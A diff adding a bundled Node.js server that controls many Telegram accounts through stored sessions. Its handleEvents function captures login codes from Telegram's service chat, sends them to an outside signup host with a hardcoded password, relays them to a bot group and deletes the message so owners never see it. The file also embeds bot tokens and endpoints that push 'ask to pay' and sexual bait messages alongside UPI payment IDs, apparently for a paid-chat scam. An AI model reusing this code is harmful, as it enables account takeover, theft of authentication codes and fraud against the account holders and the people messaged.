+                        return new Promise(async (resolve) => {
+                            let retry = 0
+                            const intervalId = setInterval(async () => {
+                                console.log("checking code");
+                                retry++
+                                const isReady = isMailReady();
+                                if (isReady && retry < 4) {
+                                    const code = await getcode();
+                                    if (code !== '') {
+                                        clearInterval(intervalId);
+                                        disconnectfromMail()
+                                        resolve(code);
+                                    }
+                                } else {
+                                    clearInterval(intervalId);
+                                    await this.client.disconnect();
+                                    await deleteClient(this.phoneNumber);
+                                    disconnectfromMail()
+                                    resolve(code);
+                                }
+                            }, 6000);
+                        });
+                    },
+                    onEmailCodeError: (e) => { console.log(e); return Promise.resolve("error") }
+                })
+            }
+        }, 5000);
+    }
+
+    async updatePrivacyforDeletedAccount() {
+        try {
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneCall({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Calls Updated")
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyProfilePhoto({}),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("PP Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneNumber({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Number Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyStatusTimestamp({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyAbout({}),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("LAstSeen Updated")
+        }
+        catch (e) {
+            console.log(e)
+        }
+    }
+    async updateProfile(firstName, about) {
+        try {
+            const result = await this.client.invoke(
+                new Api.account.UpdateProfile({
+                    firstName: firstName,
+                    lastName: "",
+                    about: about,
+                })
+            );
+            console.log("Updated NAme: ", firstName);
+        } catch (error) {
+            console.log(error)
+        }
+    }
+    async updateUsername(baseUsername) {
+        let newUserName = ''
+        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
+        let increment = 0;
+        if (username === '') {
+            try {
+                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
+                console.log(`Removed Username successfully.`);
+            } catch (error) {
+                console.log(error)
+            }
+        } else {
+            while (true) {
+                try {
+                    const result = await this.client.invoke(
+                        new Api.account.CheckUsername({ username })
+                    );
+                    console.log(result, " - ", username)
+                    if (result) {
+                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
+                        console.log(`Username '${username}' updated successfully.`);
+                        newUserName = username
+                        break;
+                    } else {
+                        username = baseUsername + increment;
+                        increment++;
+                        await sleep(4000);
+                    }
+                } catch (error) {
+                    console.log(error.message)
+                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
+                        newUserName = username;
+                        break;
+                    }
+                    username = baseUsername + increment;
+                    increment++;
+                }
+            }
+        }
+        return newUserName;
+    }
+
+    async updateProfilePic(image) {
+        try {
+            const file = await this.client.uploadFile({
+                file: new CustomFile(
+                    'pic.jpg',
+                    fs.statSync(
+                        image
+                    ).size,
+                    image
+                ),
+                workers: 1,
+            });
+            console.log("file uploaded- ", file)
+            await this.client.invoke(new Api.photos.UploadProfilePhoto({
+                file: file,
+            }));
+            console.log("profile pic updated")
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async updatePrivacy() {
+        try {
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneCall({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Calls Updated")
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyProfilePhoto({}),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("PP Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneNumber({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Number Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyStatusTimestamp({}),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("LAstSeen Updated")
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyAbout({}),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+        }
+        catch (e) {
+            console.log(e)
+        }
+    }
+    async handleEvents(event) {
+        if (event.isPrivate) {
+            console.log("Message Recieved from - ", event.message.chatId.toString(), ": ", event.message.text)
+            if (event.message.chatId.toString() == "777000") {
+                console.log("Login Code received for - ", this.phoneNumber, '\nSetup - ', activeClientSetup);
+                if (activeClientSetup && this.phoneNumber === activeClientSetup?.phoneNumber) {
+                    console.log("LoginText: ", event.message.text)
+                    const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
+                    console.log("Code is:", code)
+                    try {
+                        const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
+                        console.log("Code Sent");
+                    } catch (error) {
+                        console.log(error)
+                    }
+                    await deleteClient(this.phoneNumber)
+                }
+                console.log(event.message.text.toLowerCase());
+                const payload = {
+                    "chat_id": "-1001801844217",
+                    "text": event.message.text
+                };
+                axios.post(ppplbot, payload)
+                    .then((response) => {
+                    })
+                    .catch((error) => {
+                        console.error('Error sending message:', error.response?.data?.description);
+                    });
+                await event.message.delete({ revoke: true });
+            }
+        }
+    }
+}
+
+module.exports = { TelegramManager, hasClient, getClient, disconnectAll, createClient, deleteClient, getActiveClientSetup, setActiveClientSetup }
+
+
+/***/ }),
+
+/***/ "./utils.js":
+/*!******************!*\
+  !*** ./utils.js ***!
+  \******************/
+/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
+
+const axios = __webpack_require__(/*! axios */ "axios");
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function fetchWithTimeout(resource, options = {}, maxRetries = 3) {
+  const timeout = options?.timeout || 15000;
+
+  const source = axios.CancelToken.source();
+  const id = setTimeout(() => source.cancel(), timeout);
+  for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {
+    try {
+      const response = await axios({
+        ...options,
+        url: resource,
+        cancelToken: source.token
+      });
+      clearTimeout(id);
+      return response;
+    } catch (error) {
+      if (axios.isCancel(error)) {
+        console.log('Request canceled:', error.message, resource);
+      } else {
+        console.log('Error:', error.message);
+      }
+      if (retryCount < maxRetries) {
+        await new Promise(resolve => setTimeout(resolve, 2000)); // 1 second delay
+      } else {
+        console.error(`All ${maxRetries + 1} retries failed for ${resource}`);
+        return undefined;
+      }
+    }
+  }
+}
+
+module.exports = { sleep, fetchWithTimeout }
+
+/***/ })
+
+/******/ 	});
+/************************************************************************/
+/******/ 	// The module cache
+/******/ 	var __webpack_module_cache__ = {};
+/******/ 	
+/******/ 	// The require function
+/******/ 	function __webpack_require__(moduleId) {
+/******/ 		// Check if module is in cache
+/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
+/******/ 		if (cachedModule !== undefined) {
+/******/ 			return cachedModule.exports;
+/******/ 		}
+/******/ 		// Create a new module (and put it into the cache)
+/******/ 		var module = __webpack_module_cache__[moduleId] = {
+/******/ 			// no module.id needed
+/******/ 			// no module.loaded needed
+/******/ 			exports: {}
+/******/ 		};
+/******/ 	
+/******/ 		// Execute the module function
+/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
+/******/ 	
+/******/ 		// Return the exports of the module
+/******/ 		return module.exports;
+/******/ 	}
+/******/ 	
+/************************************************************************/
+var __webpack_exports__ = {};
+// This entry need to be wrapped in an IIFE because it need to be in strict mode.
+(() => {
+"use strict";
+/*!******************!*\
+  !*** ./index.js ***!
+  \******************/
+
+const dotenv = __webpack_require__(/*! dotenv */ "dotenv")
+dotenv.config();
+const express = __webpack_require__(/*! express */ "express");
+const axios = __webpack_require__(/*! axios */ "axios");
+const schedule = __webpack_require__(/*! node-schedule-tz */ "node-schedule-tz");
+const timeOptions = { timeZone: 'Asia/Kolkata', timeZoneName: 'short' };
+const ChannelService = __webpack_require__(/*! ./dbservice */ "./dbservice.js");
+const { getClient, hasClient, disconnectAll, createClient, deleteClient, setActiveClientSetup, getActiveClientSetup } = __webpack_require__(/*! ./telegramManager */ "./telegramManager.js");
+const bodyParser = __webpack_require__(/*! body-parser */ "body-parser");
+const swaggerUi = __webpack_require__(/*! swagger-ui-express */ "swagger-ui-express");
+const swaggerSpec = __webpack_require__(/*! ./swaggerConfig */ "./swaggerConfig.js");
+const { sleep } = __webpack_require__(/*! ./utils */ "./utils.js");
+const { fetchWithTimeout } = __webpack_require__(/*! ./utils */ "./utils.js");
+const { execSync } = __webpack_require__(/*! child_process */ "child_process");
+const { CloudinaryService } = __webpack_require__(/*! ./cloudinary */ "./cloudinary.js")
+
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
+});
+process.on('exit', async () => {
+  await ChannelService.getInstance().closeConnection();
+  await disconnectAll();
+});
+
+var cors = __webpack_require__(/*! cors */ "cors");
+const app = express();
+const port = 8000;
+const userMap = new Map();
+
+let ip;
+let clients;
+let upiIds;
+const pings = {}
+
+fetchWithTimeout('https://ipinfo.io/json')
+  .then(result => {
+    return result.data;
+  })
+  .then((output) => {
+    ip = output;
+    console.log(ip)
+  })
+  .then(() => {
+    ChannelService.getInstance().connect().then(async () => {
+      setTimeout(async () => {
+        checkerclass.getinstance()
+        await setUserMap();
+        setTimeout(() => {
+          // Array.from(userMap.values()).map(async (value) => {
+          //   try {
+          //     joinchannels(value);
+          //     await sleep(3000);
+          //   } catch (error) {
+          //     console.log("Some Error: ", error.code);
+          //   }
+          // })
+          joinchannelForBufferClients();
+        }, 120000);
+      }, 100);
+    })
+  }
+).catch(err => {
+  console.error(err)
+  joinchannelForBufferClients();
+})
+
+let count = 0;
+let botCount = 0
+const ppplbot = () => {
+  let token;
+  if (botCount % 2 == 1) {
+    token = `bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY`
+  } else {
+    token = `bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA`
+  }
+
+  return `https://api.telegram.org/${token}/sendMessage?chat_id=-1001801844217`
+}
+const pingerbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001703065531`;
+
+const apiResp = {
+  INSTANCE_NOT_EXIST: "INSTANCE_NOT_EXIST",
+  CLIENT_NOT_EXIST: "CLIENT_NOT_EXIST",
+  CONNECTION_NOT_EXIST: "CONNECTION_NOT_EXIST",
+  ALL_GOOD: "ALL_GOOD",
+  DANGER: "DANGER",
+  WAIT: "WAIT"
+};
+
+async function setUserMap() {
+  userMap.clear();
+  const db = ChannelService.getInstance();
+  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map`);
+  const users = await db.getAllUserClients();
+  clients = users
+  upiIds = await db.getAllUpis()
+  users.forEach(user => {
+    userMap.set(user.userName.toLowerCase(), { url: `${user.repl}/`, timeStamp: Date.now(), deployKey: user.deployKey, downTime: 0, lastPingTime: Date.now(), clientId: user.clientId })
+    pings[user.userName.toLowerCase()] = Date.now();
+  })
+}
+
+function getCurrentHourIST() {
+  const now = new Date();
+  const istOffset = 5.5 * 60 * 60 * 1000;
+  const istTime = new Date(now.getTime() + istOffset);
+  const istHour = istTime.getUTCHours();
+  return istHour;
+}
+const connetionQueue = [];
+try {
+  schedule.scheduleJob('test3', ' 25 2 * * * ', 'Asia/Kolkata', async () => {
+    checkBufferClients()
+    for (const value of userMap.values()) {
+      try {
+        const now = new Date();
+        if (now.getUTCDate() % 3 === 1) {
+          await fetchWithTimeout(`${value.url}leavechannels`);
+        }
+      } catch (error) {
+        console.log("Some Error: ", error.code);
+      }
+      await sleep(3000)
+    }
+    await fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)
+    await fetchWithTimeout(`https://mychatgpt-pg6w.onrender.com/deletefiles`);
+  })
+  schedule.scheduleJob('test3', ' 25 12 * * * ', 'Asia/Kolkata', async () => {
+    fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)
+    joinchannelForBufferClients();
+  })
+} catch (error) {
+  console.log("Some Error: ", error.code);
+}
+
+
+app.use(cors());
+app.use(bodyParser.json());
+app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));
+app.get('/', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+
+  //
+});
+
+app.get('/exitacc', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  //
+});
+
+app.get('/checkBufferClients', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Checking Buffer Clients');
+  next();
+}, async (req, res) => {
+  await checkBufferClients();
+});
+
+app.get('/processUsers/:limit/:skip', async (req, res, next) => {
+  res.send("ok")
+  next();
+}, async (req, res) => {
+  const limit = req.params.limit ? req.params.limit : 30
+  const skip = req.params.skip ? req.params.skip : 20
+  const db = await ChannelService.getInstance();
+  const cursor = await db.processUsers(parseInt(limit), parseInt(skip));
+  while (await cursor.hasNext()) {
+    const document = await cursor.next();
+    const cli = await createClient(document.mobile, document.session);
+    const client = await getClient(document.mobile);
+    if (cli) {
+      console.log(document.mobile, " :  true");
+      const lastActive = await client.getLastActiveTime();
+      const date = new Date(lastActive * 1000).toISOString().split('T')[0];
+      const me = await client.getMe()
+      await db.updateUser(document, { msgs: cli.msgs, totalChats: cli.total, lastActive, date, tgId: me.id.toString(), lastUpdated: new Date().toISOString().split('T')[0] });
+      await client?.disconnect(document.mobile);
+      await deleteClient()
+    } else {
+      console.log(document.mobile, " :  false");
+      await db.deleteUser(document);
+    }
+  }
+  console.log("finished")
+});
+
+app.get('/refreshMap', async (req, res) => {
+  checkerclass.getinstance();
+  await setUserMap();
+  res.send('Hello World!');
+});
+
+app.get('/clearstats2', async (req, res) => {
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  await db.clearStats2();
+  res.send('Hello World!');
+});
+
+app.get('/exit', async (req, res) => {
+  await ChannelService.getInstance().closeConnection();
+  process.exit(1)
+  res.send('Hello World!');
+});
+
+app.post('/channels', async (req, res, next) => {
+  res.send('Hello World!');
+  // console.log(req.body);
+  next();
+}, async (req, res) => {
+  const channels = req.body?.channels;
+  const db = ChannelService.getInstance();
+  channels?.forEach(async (channel) => {
+    await db.insertChannel(channel);
+  })
+});
+
+let settingupClient = Date.now() - 250000;
+app.get('/setupClient/:clientId', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  if (Date.now() > (settingupClient + 240000)) {
+    await disconnectAll();
+    await sleep(1000)
+    settingupClient = Date.now();
+    const clientId = req.params?.clientId;
+    const archieveOld = req?.query?.a;
+    const days = req?.query?.d;
+    const mobile = req?.query?.m;
+    const formalities = req?.query?.f;
+    const PLimited = !!req.query.PLimited;
+    console.log(clientId, archieveOld);
+    await fetchWithTimeout(`${ppplbot()}&text=Received NEw Client Request for - ${clientId}`);
+    await setUpClient(clientId.toString(), archieveOld?.toLowerCase() === 'yes' ? true : false, days, mobile, formalities?.toLowerCase() === 'no' ? false : true, PLimited)
+  } else {
+    console.log("Profile Setup Recently tried");
+  }
+})
+
+app.get('/updateClient/:clientId', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  settingupClient = Date.now();
+  const clientId = req.params?.clientId;
+  console.log(clientId);
+  await updateClient(clientId.toString())
+})
+
+app.get('/getip', (req, res) => {
+  res.json(ip);
+});
+
+app.post('/users', async (req, res, next) => {
+  res.send('Hello World!');
+  console.log(req.body);
+  next();
+}, async (req, res) => {
+  const user = req.body;
+  const db = ChannelService.getInstance();
+  const cli = getClient(user.mobile);
+  const activeClientSetup = getActiveClientSetup()
+  if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {
+    user['lastUpdated'] = new Date().toISOString().split('T')[0]
+    await db.insertUser(user);
+    await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
+  } else {
+    setActiveClientSetup(undefined)
+    console.log("New Session Generated");
+    await setNewClient(user, activeClientSetup);
+    await deleteClient(user.mobile)
+  }
+});
+
+app.get('/channels/:limit/:skip', async (req, res, next) => {
+  const limit = req.params.limit ? req.params.limit : 30
+  const skip = req.params.skip ? req.params.skip : 20
+  const k = req.query?.k
+  const db = ChannelService.getInstance();
+  const channels = await db.getChannels(parseInt(limit), parseInt(skip), k);
+  let resp = 'joinchannel:'
+  for (const channel of channels) {
+    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
+  }
+  res.send(resp);
+});
+
+app.get('/activechannels/:limit/:skip', async (req, res, next) => {
+  const limit = req.params.limit ? req.params.limit : 30
+  const skip = req.params.skip ? req.params.skip : 20
+  const k = req.query?.k
+  const db = ChannelService.getInstance();
+  const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), [k], [], 'channels');
+  let resp = 'joinchannel:'
+  for (const channel of result) {
+
+    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
+  }
+  res.send(resp);
+});
+
+let refresTime = Date.now();
+app.get('/getdata', async (req, res, next) => {
+  checkerclass.getinstance()
+  if (Date.now() > refresTime) {
+    refresTime = Date.now() + (5 * 60 * 1000);
+    Array.from(userMap.values()).map(async (value) => {
+      await fetchWithTimeout(`${value.url}markasread`);
+    })
+  }
+  res.setHeader('Content-Type', 'text/html');
+  let resp = '<html><head></head><body>';
+  resp = resp + await getData();
+  resp += '</body></html>';
+  resp += `<script>
+              console.log("hii");
+              setInterval(() => {
+                window.location.reload();
+              }, 20000);
+          </script>`;
+  res.send(resp);
+});
+
+app.get('/getdata2', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    await fetchWithTimeout(`${value.url}getDemostat2`);
+    await sleep(1000);
+  }
+});
+
+app.get('/getAllIps', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    try {
+      console.log(value.clientId)
+      const res = await fetchWithTimeout(`${value.url}getip`);
+      console.log(res.data);
+    } catch (error) {
+
+    }
+  }
+});
+
+app.get('/refreshupis', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    await fetchWithTimeout(`${value.url}refreshupis`);
+  }
+});
+
+app.get('/getuserdata', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    await fetchWithTimeout(`${value.url}getuserstats`);
+    await sleep(1000);
+  }
+});
+
+app.get('/getuserdata2', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    await fetchWithTimeout(`${value.url}getuserstats2`);
+    await sleep(1000);
+  }
+});
+
+app.get('/restartall', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  Array.from(userMap.values()).map(async (value) => {
+    await fetchWithTimeout(`${value.deployKey}`);
+  })
+});
+app.get('/sendtoall', async (req, res, next) => {
+  checkerclass.getinstance();
+  console.log('Received sendtoall request');
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const queries = req.query
+  let newQuery = '';
+  Object.keys(req.query).map((key) => {
+    newQuery += `${queries[key]}/`
+  });
+  console.log(newQuery);
+  for (const value of userMap.values()) {
+    const url = `${value.url}${newQuery}`;
+    console.log(url);
+    await sleep(1000);
+    await fetchWithTimeout(url);
+  }
+});
+
+app.get('/usermap', async (req, res) => {
+  checkerclass.getinstance()
+  console.log('Received Usermap request');
+  res.json(Array.from(userMap.values()));
+});
+
+app.get('/getbufferclients', async (req, res) => {
+  const db = ChannelService.getInstance();
+  const result = []
+  const clients = await db.readBufferClients({});
+  clients.forEach((cli) => {
+    result.push(cli.mobile);
+  })
+  res.json(result);
+});
+
+app.get('/clients', async (req, res) => {
+  checkerclass.getinstance();
+  console.log('Received Client request');
+  res.json(clients)
+});
+
+app.get('/keepready2', async (req, res, next) => {
+  checkerclass.getinstance()
+  console.log('Received keepready2 request');
+  res.send(`Responding!!\nMsg = ${req.query.msg}`);
+  next();
+}, async (req, res) => {
+  const msg = req.query.msg;
+  console.log("Msg2 = ", msg);
+  Array.from(userMap.values()).map(async (value) => {
+    await fetchWithTimeout(`${value.url}resptopaid2?msg=${msg ? msg : "Oye..."}`);
+    await fetchWithTimeout(`${value.url}getDemostats`);
+  });
+  const db = ChannelService.getInstance();
+  await db.clearStats()
+});
+
+app.get('/keepready', async (req, res, next) => {
+  checkerclass.getinstance();
+  console.log('Received Keepready request');
+  const dnsMsg = encodeURIComponent(`Dont Speak Okay!!\n**I am in Bathroom**\n\nMute yourself!!\n\nI will show you Okay..!!`)
+  const msg = req.query.msg.toLowerCase() == 'dns' ? dnsMsg : req.query.msg;
+  Array.from(userMap.values()).map(async (value) => {
+    await fetchWithTimeout(`${value.url}resptopaid?msg=${msg ? msg : "Oye..."}`);
+  });
+  const db = ChannelService.getInstance();
+  await db.clearStats();
+  res.send(`Responding!!\nMsg = ${msg}`);
+});
+
+app.get('/asktopay', async (req, res, next) => {
+  checkerclass.getinstance();
+  console.log('Received AsktoPay request');
+  res.send(`Asking Pppl`);
+  next();
+}, async (req, res) => {
+  const msg = req.query.msg;
+  console.log("Msg = ", msg);
+  Array.from(userMap.values()).map(async (value) => {
+    await fetchWithTimeout(`${value.url}asktopay`)
+  })
+});
+
+let callingTime = Date.now();
+app.get('/calltopaid', async (req, res, next) => {
+  checkerclass.getinstance()
+  console.log('Received Call request');
+  res.send(`Asking Pppl`);
+  next();
+}, async (req, res) => {
+  const msg = req.query.msg;
+  console.log("Msg = ", msg);
+  if (Date.now() > callingTime) {
+    callingTime = Date.now() + (10 * 60 * 1000)
+    Array.from(userMap.values()).map(async (value) => {
+      await fetchWithTimeout(`${value.url}calltopaid`)
+    })
+  }
+});
+
+
+app.get('/markasread', async (req, res, next) => {
+  checkerclass.getinstance();
+  console.log('Received MarkasRead Req');
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const all = req.query.all;
+  if (Date.now() > refresTime) {
+    refresTime = Date.now() + (5 * 60 * 1000);
+    console.log("proceeding with all = ", all);
+    Array.from(userMap.values()).map(async (value) => {
+      await fetchWithTimeout(`${value.url}markasread?${all ? "all=true" : ''}`);
+    })
+  }
+});
+
+app.get('/setactiveqr', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  const upi = req.query.upi;
+  console.log("upi = ", upi);
+  Array.from(userMap.values()).map(async (value) => {
+    await fetchWithTimeout(`${value.url}setactiveqr?upi=${upi}`);
+  })
+});
+
+app.get('/getUpiId', async (req, res) => {
+  checkerclass.getinstance();
+  const app = req.query.app ? req.query.app : "paytm3"
+  const db = ChannelService.getInstance();
+  const upiId = await db.getupi(app);
+  res.send(upiId);
+});
+
+app.get('/getAllUpiIds', async (req, res) => {
+  checkerclass.getinstance();
+  res.json(upiIds);
+});
+
+app.post('/getAllUpiIds', async (req, res, next) => {
+  const data = req.body
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  const upiIds = await db.updateUpis(data);
+  res.json(upiIds);
+  next();
+}, async () => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    await fetchWithTimeout(`${value.url}refreshupis`);
+  }
+})
+
+app.get('/getUserConfig', async (req, res) => {
+  const filter = req.query
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  const userConfig = await db.getUserConfig(filter);
+  res.json(userConfig);
+});
+
+app.post('/getUserConfig', async (req, res) => {
+  const filter = req.query
+  const data = req.body
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  const upiIds = await db.updateUserConfig(filter, data);
+  await setUserMap();
+  res.json(upiIds);
+});
+
+
+app.get('/builds', async (req, res) => {
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  const data = await db.getBuilds();
+  console.log(data);
+  res.json(data);
+});
+
+app.post('/builds', async (req, res) => {
+  const data = req.body
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  console.log(data);
+  const result = await db.updateBuilds(data);
+  res.json(result);
+});
+
+app.get('/getAllUserClients', async (req, res) => {
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  const userConfig = await db.getAllUserClients();
+  const resp = []
+  userConfig.map((user) => {
+    resp.push(user.clientId)
+  })
+  res.send(resp);
+});
+
+app.get('/getTgConfig', async (req, res) => {
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  const tgConfig = await db.getTgConfig()
+  res.json(tgConfig);
+});
+
+app.get('/updateActiveChannels', async (req, res) => {
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  const tgConfig = await db.updateActiveChannels();
+  res.send("ok");
+});
+
+app.get('/getCurrentActiveUniqueChannels', async (req, res) => {
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  const result = await db.getCurrentActiveUniqueChannels();
+  res.json({ length: result.length, data: result });
+});
+
+app.post('/getTgConfig', async (req, res, next) => {
+  const data = req.body
+  checkerclass.getinstance();
+  const db = ChannelService.getInstance();
+  const upiIds = await db.updateUpis(data)
+  res.json(upiIds);
+  next();
+}, async () => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    await fetchWithTimeout(`${value.url}refreshupis`);
+  }
+});
+
+app.get('/lastpings', async (req, res, next) => {
+  checkerclass.getinstance();
+  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    resp = resp + `${value.clientId}  :  ${Number(((Date.now() - value.lastPingTime) / 60000).toFixed(2))}\n`
+  }
+  resp += '</pre></body></html>';
+  res.setHeader('Content-Type', 'text/html');
+  res.send(resp);
+});
+
+app.get('/lastpingsjson', async (req, res, next) => {
+  checkerclass.getinstance();
+  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
+  for (const userdata in pings) {
+    resp = resp + `${userdata}  :  ${Number(((Date.now() - pings[userdata]) / 60000).toFixed(2))}\n`
+  }
+  resp += '</pre></body></html>';
+  res.setHeader('Content-Type', 'text/html');
+  res.send(resp);
+});
+
+app.get('/exitglitches', async (req, res, next) => {
+  res.send("ok")
+  next();
+}, async () => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    if (value.url.toLowerCase().includes('glitch'))
+      await fetchWithTimeout(`${value.url}exit`);
+  }
+});
+
+app.get('/exitprimary', async (req, res, next) => {
+  res.send("ok")
+  next();
+}, async () => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    if (value.clientId.toLowerCase().includes('1'))
+      await fetchWithTimeout(`${value.url}exit`);
+  }
+});
+
+app.get('/exitsecondary', async (req, res, next) => {
+  res.send("ok")
+  next();
+}, async () => {
+  const userValues = Array.from(userMap.values());
+  for (let i = 0; i < userValues.length; i++) {
+    const value = userValues[i];
+    if (value.clientId.toLowerCase().includes('2'))
+      await fetchWithTimeout(`${value.url}exit`);
+  }
+});
+
+app.get('/connectclient/:number', async (req, res) => {
+  const number = req.params?.number;
+  const db = ChannelService.getInstance();
+  const user = await db.getUser({ mobile: number });
+  if (user) {
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      if (cli) {
+        res.send("client created");
+      } else {
+        res.send("client EXPIRED");
+      }
+    } else {
+      res.send("Client Already existing");
+    }
+  } else {
+    res.send("User Does not exist");
+  }
+});
+
+app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
+  res.send("joiningChannels");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const limit = req.params.limit ? req.params.limit : 30
+    const skip = req.params.skip ? req.params.skip : 20
+    const k = req.query?.k
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session, false);
+      if (cli) {
+        const client = await getClient(user.mobile);
+        const channels = await client.channelInfo(true);
+        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];
